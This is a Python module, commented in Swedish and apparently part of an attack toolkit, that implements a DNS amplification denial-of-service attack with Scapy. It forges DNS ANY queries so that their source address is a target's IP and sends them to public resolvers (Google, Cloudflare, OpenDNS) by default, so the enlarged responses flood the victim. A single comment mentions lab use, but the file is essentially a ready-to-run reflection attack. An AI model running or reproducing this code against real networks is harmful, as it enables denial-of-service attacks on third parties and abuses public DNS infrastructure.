"""
DNS Amplification Attack
Utnyttjar DNS-servrar för att amplificera trafik
"""
from scapy.all import IP, UDP, DNS, DNSQR, Raw
import time
from .base_attack import BaseAttack
from utils.network_utils import generate_random_port


class DNSAmplificationAttack(BaseAttack):
    """DNS Amplification - Använder DNS för att amplificera trafik"""

    def get_attack_name(self):
        return "DNS Amplification"

    def execute(self, count=100, dns_servers=None):
        """
        Kör DNS amplification attack
        dns_servers: Lista med DNS-servrar att använda för amplification
        """
        # Använd publika DNS-servrar som exempel (dessa filtrerar ofta, använd egna i labb!)
        if dns_servers is None:
            dns_servers = [
                "8.8.8.8",      # Google DNS
                "1.1.1.1",      # Cloudflare
                "208.67.222.222" # OpenDNS
            ]

        self.print_header("DNS Amplification Attack", port=53, count=count)

        print("[*] DNS Amplification utnyttjar öppna DNS-servrar")
        print(f"[*] Använder {len(dns_servers)} DNS-servrar för amplification")
        print(f"[*] Förväntad amplifikation: 28-54x (små queries → stora svar)")

        self.start_time = time.time()
        self.packets_sent = 0

        # Domäner som ger stora DNS-svar (ANY queries)
        query_domains = [
            f"{self.custom_message}.com",
            f"test-{self.custom_message}.org",
            "isc.org",  # Känd för stora DNS-svar
            "ripe.net"
        ]

        for i in range(count):
            # Välj DNS-server och domän
            dns_server = dns_servers[i % len(dns_servers)]
            query_domain = query_domains[i % len(query_domains)]
            fake_sport = generate_random_port()

            # Skapa DNS ANY query (ger stor respons)
            # Source IP är spoofad till target (amplification!)
            dns_query = IP(src=self.target_ip, dst=dns_server)/ \
                       UDP(sport=fake_sport, dport=53)/ \
                       DNS(rd=1, qd=DNSQR(qname=query_domain, qtype=255))

            # Lägg till custom payload
            payload_marker = f"\n[{self.custom_message}_DNS_AMP_{i+1}]".encode()
            dns_query = dns_query / Raw(load=payload_marker)

            self.send_packet(dns_query)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] DNS Amp: {i + 1}/{count} queries skickade ({pps:.1f} pps)")
                print(f"    → DNS-servrar svarar till {self.target_ip} (amplifierat)")

        self.log_attack("DNS_AMPLIFICATION",
                       f"{count} DNS ANY queries, target: {self.target_ip}, message: {self.custom_message}")
        self.print_summary()

        print("\n[!] OBS: DNS-svaren skickas till target IP (amplification)")
        print("[!] Varje litet query (60 bytes) → Stort svar (1500+ bytes)")